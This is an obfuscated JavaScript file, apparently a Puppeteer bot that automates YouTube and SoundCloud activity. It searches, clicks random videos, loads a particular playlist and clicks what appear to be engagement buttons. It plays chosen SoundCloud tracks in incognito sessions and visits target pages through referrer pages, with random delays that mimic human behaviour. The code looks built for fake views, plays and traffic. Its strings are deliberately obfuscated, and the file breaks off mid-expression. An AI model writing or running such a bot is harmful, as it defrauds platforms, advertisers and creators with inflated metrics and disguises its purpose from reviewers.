const a1 = d,
  a0 = b,
  Z = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0xc49 + 0x2567 + -0x191d))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x1cb8 + 0x2cf * 0xb + -0x3b9d), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0xa955 * 0x1 + 0x77ec + 0xa699 + (0x49 * 0x2f + 0x661b + -0x38ea) * random()) : await standardWaitForNetIdle(f), await wait(0x22c2 + 0x26 * -0x56 + -0x6 * 0x69 + (-0xa * 0x83 + -0x3569 + -0x245 * -0x2b) * random()), -0x1525 + 0x1f01 + 0x349 * -0x3;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x205 * 0xb + 0x161e + -0x1 * 0x18cd), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x20fd + -0x1 * 0x13b2 + 0x2 * -0x6a5;
}
async function randomWait() {
  return await wait(0x2 * 0x58 + -0x634 * 0x5 + 0x18ee * 0x2 + (0x26a5 + -0x2603 + 0x12e6) * random()), -0xeac + -0xf1c + 0x1dc9;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x2469 + 0x2628 + -0x4a91, 0x1fcc + -0x643 * 0x6 + 0x5cd), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x11b9 * 0x4 + -0x1 * 0x54be + -0xc301 * -0x2) * getRandomInt(-0x13a0 + 0xdb0 + 0x5f2, -0x2e4 + -0x43 + -0x1 * -0x32c), h)), 0x2185 + -0x142 * 0x7 + 0x2 * -0xc5b;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0xb * -0x7d + 0x104b + -0x15aa;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x7e8 * -0x1 + -0x71 * 0x39 + 0x1142]['split']('\x20');
    for (let k = 0x1a84 + 0x8b7 + 0x1 * -0x233b; k < i['length']; k += -0x2220 + 0x828 + 0x19fa)
      j += i[k] * h[i[k + (0x12cd + -0x3 * -0x503 + -0xb47 * 0x3)]];
    return j;
  });
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x5 * 0x4ee + -0x2f * -0x93 + -0x257);
    let h = e[f];
    if (b['DdvSpB'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x1711 + 0x2061 + 0x3772 * -0x1, s, t, u = -0x1e47 + 0x1 * -0x79f + 0x25e6; t = n['charAt'](u++); ~t && (s = r % (0x2567 + -0x1509 + 0x142 * -0xd) ? s * (-0x2e3 * 0xa + 0x1f4a + 0x22c * -0x1) + t : t, r++ % (-0x1d4e + 0x1ae4 * -0x1 + 0xb3e * 0x5)) ? p += String['fromCharCode'](-0x11 * 0xec + -0x1b11 + 0x12 * 0x26e & s >> (-(0x240a + -0x711 + -0x5 * 0x5cb) * r & -0x1a10 + 0x35e + -0x2d7 * -0x8)) : 0x73 * -0x2e + 0xc * 0x226 + -0x1 * 0x51e) {
          t = o['indexOf'](t);
        }
        for (let v = -0x283 * -0x1 + -0x409 + -0x2 * -0xc3, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x262 * -0x7 + 0x3 * 0x103 + -0x183 * 0xd))['slice'](-(-0x1b26 * -0x1 + 0x1dc8 + -0x38ec));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1558 + -0xeac + 0x2404,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x5 * 0x1e5 + 0x2469 + -0x1af0; u < 0x1fcc + -0x643 * 0x6 + 0x6c6; u++) {
          p[u] = u;
        }
        for (u = -0xa8 * 0x9 + -0x2 * 0x388 + -0x53 * -0x28; u < -0x13a0 + 0xdb0 + 0x6f0; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x2e4 + -0x43 + -0x1 * -0x427), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x2185 + -0x142 * 0x7 + 0x39 * -0x6f, q = -0xb * -0x7d + 0x104b + -0x15aa;
        for (let v = -0x7e8 * -0x1 + -0x71 * 0x39 + 0x1141; v < n['length']; v++) {
          u = (u + (0x1a84 + 0x8b7 + 0x2 * -0x119d)) % (-0x2220 + 0x828 + 0x1af8), q = (q + p[u]) % (0x12cd + -0x3 * -0x503 + -0x3a6 * 0x9), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1b05 + -0x1a85 + 0x917 * 0x6)]);
        }
        return t;
      };
      b['hFDUnk'] = m, c = arguments, b['DdvSpB'] = !![];
    }
    const j = e[-0x9 * 0x17 + 0xb27 + -0xa58],
      k = f + j,
      l = c[k];
    return !l ? (b['LOwUpS'] === undefined && (b['LOwUpS'] = !![]), h = b['hFDUnk'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function anchorAndView(f) {
  const R = b;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + R(0x16, '[9xf')), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1b05 + -0x1a85 + 0xd64 * 0x4)['map'](l => Array['from'](l['children']))['flat'](-0x9 * 0x17 + 0xb27 + -0xa57)['map'](l => l['childNodes'][0x49b + -0xb2a * -0x2 + -0x1aee]['childNodes'][-0x22f5 * -0x1 + -0x13 * -0x17b + -0x3f16]['childNodes'][-0xfcd + -0x7 * 0x4d6 + 0x31a8]['childNodes'][-0xef * -0x13 + 0x1c1 * -0x11 + -0x60a * -0x2]['childNodes'][0x1 * -0x8c9 + -0xbb5 + -0x147f * -0x1]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x25ec + -0x2665 * 0x1 + -0x13 * -0x3b, -0xca4 + -0x497 + 0x24c3)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x3c51 + -0x455 * 0x17 + 0xda8c);
  const h = await getMaxTime(f),
    i = Math['min']((0x2 * -0xac45 + -0x1 * -0xd747 + -0x2dd * -0x7f) * getRandomInt(0x1519 + -0xfe3 + -0x534, 0x81c + 0x20ab + 0xd96 * -0x3), h);
  return await wait(i), 0x17ed * 0x1 + 0x508 * 0x1 + 0x4 * -0x73d;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x5 * 0x4ee + -0x2f * -0x93 + -0x257);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function frontScreenActions(f) {
  const S = d;
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x1 * 0xe26 + 0x156c + -0x746]['children'][0x2b * 0xbf + 0x9f9 + 0x301 * -0xe]['children'][-0x1316 + 0x17ac + -0x496]['children'][-0xa * 0x239 + 0x1160 + -0x17 * -0x36]['children'][0xc46 * -0x1 + 0x24f5 * 0x1 + -0x18af]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f[S(0xd)]('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x799 + -0x1884 + 0x10ec * 0x1;
}
async function searchAndView(f) {
  const T = c;
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0xac2 * -0x3 + -0x1b61 * 0x1 + -0x481 + (0x160d + 0x11ef * 0x2 + -0x39b9) * random()
  }), await wait(0xde * -0x15 + 0x1292 + -0x2 * -0xcc + (-0x2f * 0x95 + -0x22 + 0x1ca9) * random()), await f['click']('#search-ic' + T(0xf)), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x1773 + -0x5 * 0x51b + 0x30fc]['childNodes'][0x100c + -0x721 + -0x2 * 0x475]['childNodes'][-0x5 * 0x78 + 0x7d4 + -0x3d * 0x17]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1 * -0x2317 + 0x1eb3 + -0x41c5]['childNodes'][0xd1 + -0x214c * -0x1 + -0x221d * 0x1]['childNodes'][0x36 * -0x6c + 0xe * -0x11d + 0x2660]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x2390 + 0x5e * -0x2f + -0x124d),
          r = 0x97a + 0x7 * -0x47b + 0x15e3;
        for (let u = 0x190e + -0x1f3c + 0x71 * 0xe; u < q['length']; u += 0xadc + 0x39 * -0x1f + -0x3f3)
          r += q[u] * k[q[u + (-0xff5 + -0x5 * 0x3f1 + -0x18d * -0x17)]];
        return r;
      }(n);
  });
  await wait((0x577 * 0x13 + -0x1e1a * -0x1 + 0x191d * -0x3) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x1 * -0x11705 + -0x6bb * -0x1f + -0x3 * 0x546e) * getRandomInt(0x1 * 0x679 + 0x1157 + 0x73 * -0x35, -0x81 + 0xaee + -0x1 * 0xa63), h + (0x1f * 0x130 + -0x18f + -0xfb9));
  return await wait(i), 0x1bd8 + -0x24bc * 0x1 + 0x8e5;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x923 + -0xef4 + -0x1 * -0x1817), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    const U = c;
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + U(0x3)), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x30 * 0xca + 0x2152 + 0x1046 + (0x3 * 0xb9 + 0x13 * 0x1ec + -0x22c7 * 0x1) * Math['random']());
    });
  }, 0x1749 * -0x2 + -0x24b7 + 0x6ea1);
  await wait(-0x723a6 + -0x2 * -0x47cd7 + -0x25 * -0x12f8);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x12c3b + -0x11980 + -0x11009 * -0x3) * getRandomInt(0x25e5 + -0xd9e + -0x1 * 0x1843, -0xb * -0x333 + 0x2e * 0x1b + -0x27f2)), clearInterval(h), -0xaa9 + 0x44 * 0x1c + -0x19d * -0x2;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x21d3 * 0x1 + 0x1c54 + 0x57f;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x3 * 0x2cd + -0x11b3 + 0x1a1b * 0x1;
    await randomWait();
  }
  return -0x1cde * -0x1 + 0x3 * 0x595 + -0x2d9c;
}

function a() {
  const bo = [
    'W5VcQtpdLbWOcCoXySoc',
    '\x20div\x20>\x20div',
    'y-beats?si',
    'lI4U',
    'DcbSyxn0ihrVia',
    'https://gr',
    'kuJdJJnIWONdQSkbWPBcGW',
    'Ahr0Chm6lY9ZBW',
    'nto-the-ma',
    'lxnLCMLLCY10Aa',
    'n3hdMHSFWOi+W6ldILa',
    '44geioAxPEACRoIQNUwTL+w5LsXIDa',
    'hyper-opti',
    'click',
    'jSoTtbvkc1Pxhxu',
    'B24TBgvNywn5',
    'WPX3WQqQxvdcNwBcS3a',
    'ourZAfu1nuvPvG',
    'toString',
    'y2XVC2u',
    'W57dNuSafbG',
    'Mozilla/5.',
    'kCo3uSo1WQBcT0aXW7q',
    'CIbIzwfZDcXTCG'
  ];
  a = function() {
    return bo;
  };
  return a();
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x5 * 0x4ee + -0x2f * -0x93 + -0x257);
    let h = e[f];
    if (c['kpjiJr'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x1711 + 0x2061 + 0x3772 * -0x1, r, s, t = -0x1e47 + 0x1 * -0x79f + 0x25e6; s = m['charAt'](t++); ~s && (r = q % (0x2567 + -0x1509 + 0x142 * -0xd) ? r * (-0x2e3 * 0xa + 0x1f4a + 0x22c * -0x1) + s : s, q++ % (-0x1d4e + 0x1ae4 * -0x1 + 0xb3e * 0x5)) ? o += String['fromCharCode'](-0x11 * 0xec + -0x1b11 + 0x12 * 0x26e & r >> (-(0x240a + -0x711 + -0x5 * 0x5cb) * q & -0x1a10 + 0x35e + -0x2d7 * -0x8)) : 0x73 * -0x2e + 0xc * 0x226 + -0x1 * 0x51e) {
          s = n['indexOf'](s);
        }
        for (let u = -0x283 * -0x1 + -0x409 + -0x2 * -0xc3, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x262 * -0x7 + 0x3 * 0x103 + -0x183 * 0xd))['slice'](-(-0x1b26 * -0x1 + 0x1dc8 + -0x38ec));
        }
        return decodeURIComponent(p);
      };
      c['rGsEwu'] = i, b = arguments, c['kpjiJr'] = !![];
    }
    const j = e[-0x1558 + -0xeac + 0x2404],
      k = f + j,
      l = b[k];
    return !l ? (h = c['rGsEwu'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function fetchRandomSC() {
  const W = c,
    V = d;
  return Math['random']() <= -0x1 * 0x577 + 0xa42 + -0x3 * 0x199 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + V(0x2) + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x35 * 0xf + -0x6b * 0x1f + -0x101 * -0x10 + 0.2 ? W(0x7) + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x9bb * -0x3 + -0x1 * -0x1ba3 + 0x18e + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x617 * -0x2 + -0x22b8 + 0x168a;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const X = d;
          let n = document['querySelec' + 'tor']('#content\x20>' + X(0x1) + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x2ab * 0x5c + -0x6ed3 + -0x1 * -0x2140f + getRandomInt(-0x542b * 0x1 + 0x5 * -0x301 + 0x48 * 0x231, -0x480a + -0xdf5f * -0x1 + -0x1 * 0x2225));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x124a + -0x2 * 0x978 + -0xa7 * -0x1), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x2354 + 0x17f + 0x21d5;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x418 + -0x4e7 * 0x1 + 0x8ff, -0x1 * -0x5b + -0x4 * 0x66a + 0x197f)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x1408 + 0x22d7 + -0x6ff + floor((-0x1bfa * -0x1 + -0x906 + -0xf0c) * random()))), log('p2'), log(await s['evaluate'](() => {
        const Y = d;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x2ff3bc5e + -0x6a4940fe * -0x2 + -0x84863e5a * 0x1),
          0x8e4 * -0x1903 + -0xa7d949 + 0x20637f5,
          -0x6 * 0x2262 + -0x3b3 * 0x6 + 0x1647e,
          0x11 * -0xdf + 0x2 * -0xc15 + -0xeb * -0x2b
        ], y = [
          0x17fb + -0xcd * 0xe + -0xcad,
          -0x1a90 + -0x2203 + 0x3ca3,
          -0x826 + 0x1 * 0x26c9 + -0x1e9b,
          -0x1 * -0x6d1 + -0x1 * 0xa16 + 0x117 * 0x3
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x24e3 + 0x20c7 + -0x45a9)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0xb * 0x290 + -0x7dd * 0x1 + 0x1453 * -0x1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x1d81 + -0x93 + -0x134 * -0x19) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0xa54 + -0x14b6 + -0xf85 * -0x2] = A[-0x26d + 0xa4a + -0x7cd] = A[0x1a89 + 0x2061 + -0x3ae9] = A[-0x176f + 0x1 * 0x18ce + -0x15d] = A[0x1 * 0x99e + 0x4a8 * -0x1 + -0x4f3] = A[-0xd * -0x106 + 0x218e + -0x2ed8] = A[-0x1b01 + 0x76f + -0x1 * -0x1397] = A[-0x22d1 + 0x1ad * -0x3 + 0x27de] = A[0x234f + 0x2 * -0x132a + 0x5 * 0x9c] = A[-0x143a + -0xfc1 + 0x1 * 0x2403] = A[-0x107 * 0xc + -0x13d9 * -0x1 + -0x2 * 0x3be] = A[-0x1 * -0x269 + -0xbf * 0x13 + 0xbce] = A[0x1b65 + 0x13f5 + -0x2f4f * 0x1] = A[-0x1da9 + -0x216b + 0x3f20] = A[0x1006 + 0x14b * 0x7 + -0x2 * 0xc83] = A[-0x1cdf + -0x6e1 + 0x23ce] = A[0x6c5 * 0x3 + -0x699 * -0x2 + -0x10b9 * 0x2] = 0x786 + -0x145c + -0x35 * -0x3e, this['blocks'] = A) : this['blocks'] = [
                -0x19 * 0x7f + 0xb * -0x31b + 0x2e90,
                0x1e93 + 0x1b0d + -0x2 * 0x1cd0,
                -0xfad + -0xf81 + -0x2 * -0xf97,
                0x1 * -0x26cb + 0x13ee + 0x12dd,
                0x18a4 + 0x79c * 0x1 + -0x2040,
                0xef * 0x27 + 0x12f6 + -0x375f,
                -0xa * -0x2dd + 0x1 * 0x1373 + 0x1 * -0x3015,
                0x2556 + -0x1cac + 0x2 * -0x455,
                -0xc2 * 0x2e + -0x203 * -0xd + 0x8b5,
                0x3d3 + -0x619 + 0x246,
                0xc67 * -0x2 + -0x1 * -0x1cde + -0x410,
                -0x5 * 0x2ae + 0x1099 + -0x333,
                -0xc * 0x3b + -0x88 * -0x3b + -0x1c94,
                -0x1f55 + -0x1338 + 0x328d,
                0x464 * 0x4 + 0x1314 + -0x1c * 0x14f,
                0x939 + -0x265 + -0x2 * 0x36a,
                -0x262e + 0x1 * 0x1cd6 + 0x958 * 0x1
              ], this['h0'] = 0x7cc5acd1 + -0x43 * 0x16f4ee3 + 0x4aa11b99, this['h1'] = 0x5c650b63 + -0x17d05065c + 0x2106da682, this['h2'] = 0x94720f66 + 0x2 * 0x81bb8f4 + -0xbeea450, this['h3'] = -0x19e8da * -0xc9 + -0x4ad * 0x3369 + 0x117871 * -0x2f, this['h4'] = -0x19 * -0x7f07099 + 0x10 * -0x115641c5 + 0x25 * 0x76cdd63, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x8 * 0x16a + 0xc47 + -0xf7, this['finalized'] = this['hashed'] = -0x181d * -0x1 + 0x2397 + 0x1 * -0x3bb4, this['first'] = 0xdd3 * 0x1 + -0x2435 + 0x1 * 0x1663;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x118d + 0x281 + -0x140e, O = J['length'] || 0x206f + -0x23ab + -0x17 * -0x24, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x8e + -0xe7c + 0x1 * 0xdee, P[-0x351 * 0x5 + 0x19c5 * 0x1 + -0x930] = this['block'], P[0x860 + 0x9b * -0x2e + 0x138a] = P[0x1f64 + 0x199d * -0x1 + 0x2e3 * -0x2] = P[-0x130 * 0xe + 0x15ce + -0x52c] = P[-0x15b * 0xa + 0x9 * -0x2ff + 0x2888] = P[0x11 * -0x189 + 0x27 * -0xc6 + 0x1 * 0x3847] = P[0x20 * 0xe7 + -0xb * -0x123 + 0x295c * -0x1] = P[0x1c5f + -0x4 * -0x31d + -0x28cd] = P[-0x1ff + 0x13 * -0x1f + -0x7b * -0x9] = P[-0xfa + 0x1 * -0x1ed6 + -0xfec * -0x2] = P[-0xa95 * 0x3 + -0x19a5 + 0x396d] = P[-0xb5a + -0x18a7 + 0x240b] = P[0x1 * 0x68f + -0x12db + 0xf3 * 0xd] = P[0x17e * -0x3 + 0x1369 * -0x1 + 0x17ef] = P[-0x5f1 + 0xd3e + 0x740 * -0x1] = P[0x556 + 0x155a + -0x1aa2] = P[0x17d6 + -0x16c9 * -0x1 + -0x2e90 * 0x1] = -0x2513 + -0xc8 * 0x25 + -0x1 * -0x41fb), K) {
                    for (N = this['start']; M < O && N < -0xcd5 * 0x1 + -0x1a * 0x59 + 0x161f; ++M)
                      P[N >> -0x1156 + 0x17e9 + -0x691 * 0x1] |= J[M] << y[-0xed5 + 0x7bb * 0x3 + 0x859 * -0x1 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x23d7 + -0x1b + -0x237c; ++M)
                      (L = J['charCodeAt'](M)) < 0x1ea8 + 0x8f * -0x3b + -0x2cd * -0x1 ? P[N >> 0x23fb * -0x1 + -0x2682 + -0xa3 * -0x75] |= L << y[-0x16a + -0x110 * 0x3 + 0x1 * 0x49d & N++] : L < 0xffb * -0x1 + 0x16 * -0x69 + -0x77 * -0x47 ? (P[N >> 0x1e5 * -0x5 + 0x1f80 + -0x1605] |= (-0x226d + 0x1 * -0x75f + 0x2a8c | L >> 0x1c3 + -0x2 * -0x800 + -0x11bd) << y[-0x1 * 0x17f + -0x14e9 + -0x3 * -0x779 & N++], P[N >> 0xb * -0x4f + 0xc6c + -0x1 * 0x905] |= (-0x2047 + 0x1ae7 + 0x5e0 | -0x21 * 0x25 + -0x2383 + -0x5 * -0x81b & L) << y[0x1 * 0x1e2d + 0x758 + -0x2582 & N++]) : L < -0xbbe2 + -0x193db * 0x1 + 0x327bd || L >= 0xb74a + -0x511 * -0x42 + 0x2 * -0x92d6 ? (P[N >> 0x1283 + -0x7f * 0x2d + 0x3d2] |= (0xc68 + 0x2451 + -0x1 * 0x2fd9 | L >> -0x25c7 + -0xd * 0x173 + -0x1c55 * -0x2) << y[0xeb * 0x19 + 0xe02 + 0x24f2 * -0x1 & N++], P[N >> 0x11 * 0xfd + -0xf1 * -0x1e + -0x2d09] |= (0x1 * 0x14b1 + 0x2681 * 0x1 + 0x1d59 * -0x2 | L >> -0x200f + -0x2520 + -0x4535 * -0x1 & -0x829 * 0x2 + 0x1 * 0x869 + 0x828) << y[-0x11 * 0x89 + 0x2550 + -0x1c34 & N++], P[N >> -0x2 * 0x6fd + -0x698 + -0x4 * -0x525] |= (0x828 + -0x1866 + 0x10be | -0x1a34 + 0x2345 + -0x8d2 & L) << y[-0x51 * 0xd + -0x111 + 0x531 & N++]) : (L = 0x13d36 + -0x607 * -0x3d + 0x1 * -0x1ace1 + ((-0x1 * 0xa1b + -0x229a + -0x1 * -0x30b4 & L) << 0x1490 + 0x366 + -0xbf6 * 0x2 | 0xdf9 + 0x1 * -0x1187 + 0x78d & J['charCodeAt'](++M)), P[N >> -0x10 * 0x196 + -0x65f + 0x1 * 0x1fc1] |= (0x1d * -0x9b + 0x5 * 0x3df + -0x4 * 0x37 | L >> 0x20d3 + -0x256c + -0x4ab * -0x1) << y[-0xc7 * -0x1 + -0x10c3 + 0xfff & N++], P[N >> 0xbeb + 0x11c9 + 0x2 * -0xed9] |= (-0x24cf + 